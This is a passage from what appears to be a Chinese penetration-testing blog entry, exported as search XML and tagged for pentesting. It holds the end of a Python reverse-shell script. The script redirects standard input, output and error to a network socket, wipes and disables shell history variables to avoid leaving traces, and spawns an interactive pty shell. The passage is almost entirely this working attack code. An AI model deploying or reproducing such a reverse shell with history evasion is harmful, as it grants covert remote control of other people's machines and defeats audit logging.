class="comment"># 连接到指定ip地址，端口处的套接字</span></span><br><span class="line">        <span class="keyword">print</span> (<span class="string">'connect ok'</span>)                            <span class="comment">#不报错输出connect ok</span></span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">print</span> (<span class="string">'connect failed'</span>)                        <span class="comment">#出错输出connect failed</span></span><br><span class="line">        sys.exit()</span><br><span class="line">    os.dup2(s.fileno(),<span class="number">0</span>)                               <span class="comment">#os库的dup2方法将标准输入、标准输出、标准错误输出重定向到远程</span></span><br><span class="line">    os.dup2(s.fileno(),<span class="number">1</span>)</span><br><span class="line">    os.dup2(s.fileno(),<span class="number">2</span>)</span><br><span class="line">    <span class="keyword">global</span> shell</span><br><span class="line">    os.unsetenv(<span class="string">"HISTFILE"</span>)                             <span class="comment">#环境变量的设置语法高亮</span></span><br><span class="line">    os.unsetenv(<span class="string">"HISTFILESIZE"</span>)</span><br><span class="line">    os.unsetenv(<span class="string">"HISTSIZE"</span>)</span><br><span class="line">    os.unsetenv(<span class="string">"HISTORY"</span>)</span><br><span class="line">    os.unsetenv(<span class="string">"HISTSAVE"</span>)</span><br><span class="line">    os.unsetenv(<span class="string">"HISTZONE"</span>)</span><br><span class="line">    os.unsetenv(<span class="string">"HISTLOG"</span>)</span><br><span class="line">    os.unsetenv(<span class="string">"HISTCMD"</span>)</span><br><span class="line">    os.putenv(<span class="string">"HISTFILE"</span>,<span class="string">'/dev/null'</span>)</span><br><span class="line">    os.putenv(<span class="string">"HISTSIZE"</span>,<span class="string">'0'</span>)</span><br><span class="line">    os.putenv(<span class="string">"HISTFILESIZE"</span>,<span class="string">'0'</span>)</span><br><span class="line">    pty.spawn(shell)</span><br><span class="line">    s.close()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>
]]></content>
      <tags>
        <tag>渗透</tag>
      </tags>
  </entry>
</search>
